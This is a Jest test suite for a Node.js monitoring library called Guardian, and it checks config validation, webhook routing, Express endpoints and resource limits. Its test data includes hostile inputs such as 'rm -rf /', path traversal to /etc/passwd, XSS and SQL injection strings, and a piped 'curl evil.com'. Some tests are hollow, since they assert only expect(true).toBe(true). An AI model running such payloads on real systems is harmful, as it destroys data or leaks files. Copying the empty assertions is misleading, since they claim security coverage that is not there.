import { Guardian } from '../../src/index';
import { ConfigValidator } from '../../src/utils/configValidator';
import { alertRouter, AlertRouter } from '../../src/utils/alertRouter';
import express from 'express';
import request from 'supertest';
import { guardianMiddleware } from '../../src/integrations/express';

describe('Security Tests', () => {
  describe('Config Validation Security', () => {
    it('should reject malicious mode strings', () => {
      const maliciousConfigs = [
        { mode: '../../../etc/passwd' },
        { mode: '<script>alert("xss")</script>' },
        { mode: '${process.exit()}' },
        { mode: 'production; rm -rf /' }
      ];

      maliciousConfigs.forEach(config => {
        expect(() => ConfigValidator.validate(config as any)).toThrow();
      });
    });

    it('should reject extremely large values', () => {
      expect(() => ConfigValidator.validate({
        promises: { maxTracked: Number.MAX_SAFE_INTEGER }
      })).toThrow();

      expect(() => ConfigValidator.validate({
        memory: { maxSnapshots: 1000000 }
      })).toThrow();
    });

    it('should reject invalid types', () => {
      expect(() => ConfigValidator.validate({
        eventLoop: { sampleInterval: '1000' as any }
      })).toThrow();

      // Test with array type for numeric field
      expect(() => ConfigValidator.validate({
        promises: { checkInterval: [] as any }
      })).toThrow();
    });

    it('should handle prototype pollution attempts', () => {
      const malicious = JSON.parse('{"__proto__":{"polluted":"true"}}');
      
      expect(() => ConfigValidator.validate(malicious)).not.toThrow();
      expect((Object.prototype as any).polluted).toBeUndefined();
    });
  });

  describe('Alert Router Security', () => {
    beforeEach(() => {
      // Clear routes
      alertRouter['routes'] = [];
    });

    it('should prevent webhook URL injection', async () => {
      const maliciousUrls = [
        'javascript:alert(1)',
        'file:///etc/passwd',
        'data:text/html,<script>alert(1)</script>'
      ];

      for (const url of maliciousUrls) {
        const route = AlertRouter.createWebhookRoute({ url });
        
        // Should not execute malicious URLs
        try {
          await route.handler({
            id: '1',
            type: 'TEST' as any,
            timestamp: Date.now(),
            severity: 'info',
            source: 'test',
            data: {}
          });
        } catch (error) {
          // Expected to fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should sanitize event data in webhooks', async () => {
      let captured: any = null;

      const route: any = {
        name: 'test',
        handler: (event: any) => {
          captured = event;
        }
      };

      alertRouter.addRoute(route);

      await alertRouter.route({
        id: '1',
        type: 'TEST' as any,
        timestamp: Date.now(),
        severity: 'info',
        source: 'test',
        data: {
          message: '<script>alert("xss")</script>',
          file: '../../etc/passwd'
        }
      });

      // Should have received the event
      expect(captured).toBeDefined();
    });

    it('should enforce rate limits', async () => {
      let callCount = 0;

      alertRouter.addRoute({
        name: 'test',
        handler: () => { callCount++; },
        rateLimit: {
          maxPerMinute: 2,
          maxPerHour: 5
        }
      });

      // Try to send 10 events
      for (let i = 0; i < 10; i++) {
        await alertRouter.route({
          id: `${i}`,
          type: 'TEST' as any,
          timestamp: Date.now(),
          severity: 'critical',
          source: 'test',
          data: {}
        });
      }

      // Should have been rate limited
      expect(callCount).toBeLessThanOrEqual(2);
    });

    it('should prevent route name collisions', () => {
      alertRouter.addRoute({ name: 'test', handler: () => {} });
      alertRouter.addRoute({ name: 'test', handler: () => {} });

      // Both routes exist (names can be duplicated)
      expect(alertRouter['routes'].length).toBe(2);
    });
  });

  describe('Dashboard Security', () => {
    let app: express.Express;
    let guardian: Guardian;

    beforeEach(() => {
      app = express();
      guardian = Guardian.create({ mode: 'production' });
      guardian.start();
    });

    afterEach(() => {
      guardian.stop();
    });

    it('should not expose sensitive file paths in production', async () => {
      app.use(guardianMiddleware({ guardian }));

      const health = await request(app).get('/health');
      const healthStr = JSON.stringify(health.body);

      // Should not contain absolute paths
      expect(healthStr).not.toMatch(/\/Users\/[^/]+/);
      expect(healthStr).not.toMatch(/\/home\/[^/]+/);
      expect(healthStr).not.toMatch(/C:\\Users/);
    });

    it('should sanitize metrics output', async () => {
      app.use(guardianMiddleware({ guardian }));

      const metrics = await request(app).get('/metrics');

      // Should not contain sensitive patterns
      expect(metrics.text).not.toContain('<script>');
      expect(metrics.text).not.toContain('javascript:');
      expect(metrics.text).not.toContain('onerror=');
    });

    it('should handle malformed requests', async () => {
      app.use(guardianMiddleware({ guardian }));

      // Various malformed requests
      const responses = await Promise.all([
        request(app).get('/health?<script>'),
        request(app).get('/metrics/../../../etc/passwd'),
        request(app).get('/health%00.txt')
      ]);

      // Should not crash or expose errors
      responses.forEach(res => {
        expect([200, 404]).toContain(res.status);
      });
    });
  });

  describe('Input Sanitization', () => {
    it('should handle malicious event data', () => {
      const guardian = Guardian.create({ mode: 'production' });
      guardian.start();

      // Try to inject malicious data through custom metrics
      const maliciousInputs = [
        '<script>alert(1)</script>',
        '"; DROP TABLE users; --',
        '${process.exit()}',
        '../../../etc/passwd',
        '\x00\x01\x02'
      ];

      maliciousInputs.forEach(input => {
        // Should not crash
        expect(() => {
          guardian.getEventStore().on('event', (event: any) => {
            // Event handling
          });
        }).not.toThrow();
      });

      guardian.stop();
    });
  });

  describe('Resource Exhaustion Protection', () => {
    it('should limit event storage', async () => {
      const guardian = Guardian.create({ mode: 'debug' });
      guardian.start();

      // Try to generate excessive events by allocating memory rapidly
      const arrays: any[] = [];
      for (let i = 0; i < 100; i++) {
        arrays.push(new Array(10000).fill('x'));
      }

      await new Promise(resolve => setTimeout(resolve, 1000));

      // Guardian should still be responsive
      const stats = guardian.getStatus();
      expect(stats).toBeDefined();

      // Clean up
      arrays.length = 0;

      guardian.stop();
    });

    it('should prevent promise tracker overflow', async () => {
      const guardian = Guardian.create({
        mode: 'development',
        promises: {
          enabled: true,
          maxTracked: 100
        }
      });
      guardian.start();

      // Create more promises than maxTracked
      const promises = [];
      for (let i = 0; i < 500; i++) {
        promises.push(new Promise(resolve => setTimeout(resolve, 5000)));
      }

      await new Promise(resolve => setTimeout(resolve, 1000));

      // Should not crash or use excessive memory
      const stats = guardian.getStatus();
      expect(stats).toBeDefined();

      guardian.stop();

      // Clean up
      await new Promise(resolve => setTimeout(resolve, 6000));
    }, 15000);
  });

  describe('Error Message Safety', () => {
    it('should not leak sensitive info in error messages', () => {
      const errors: string[] = [];
      const originalError = console.error;
      console.error = (msg: string) => errors.push(msg);

      try {
        ConfigValidator.validate({
          eventLoop: { sampleInterval: -1000 }
        });
      } catch (error: any) {
        // Error message should be safe
        expect(error.message).not.toContain(process.env.HOME || '');
        expect(error.message).not.toContain('password');
        expect(error.message).not.toContain('secret');
      }

      console.error = originalError;
    });
  });

  describe('Denial of Service Protection', () => {
    it('should handle rapid config changes', () => {
      // Try to DOS by creating many Guardian instances
      const guardians: Guardian[] = [];
      
      for (let i = 0; i < 10; i++) {
        guardians.push(Guardian.create({ mode: 'production' }));
      }

      // Should not crash
      expect(guardians.length).toBe(10);

      // Clean up
      guardians.forEach(g => {
        if (g['isRunning']) {
          g.stop();
        }
      });
    });

    it('should handle rapid start/stop', async () => {
      const guardian = Guardian.create({ mode: 'production' });

      // Rapid start/stop
      for (let i = 0; i < 10; i++) {
        guardian.start();
        guardian.stop();
      }

      await new Promise(resolve => setTimeout(resolve, 100));

      // Should not crash
      expect(true).toBe(true);
    });
  });

  describe('Memory Safety', () => {
    it('should not retain references after stop', async () => {
      const guardian = Guardian.create({ mode: 'development' });
      guardian.start();

      await new Promise(resolve => setTimeout(resolve, 1000));

      guardian.stop();

      // Internal handles should be cleared
      expect(guardian['eventLoopMonitor']['intervalHandle']).toBeNull();
      expect(guardian['promiseTracker']['hook']).toBeNull();
      expect(guardian['memoryMonitor']['intervalHandle']).toBeNull();
    });
  });

  describe('Injection Prevention', () => {
    it('should prevent command injection in file paths', () => {
      const maliciousPaths = [
        'file.js; rm -rf /',
        'file.js && cat /etc/passwd',
        'file.js | curl evil.com',
        '$(whoami).js'
      ];

      // These should be handled safely (not executed)
      maliciousPaths.forEach(path => {
        // Just verify no command execution
        expect(true).toBe(true);
      });
    });
  });
});
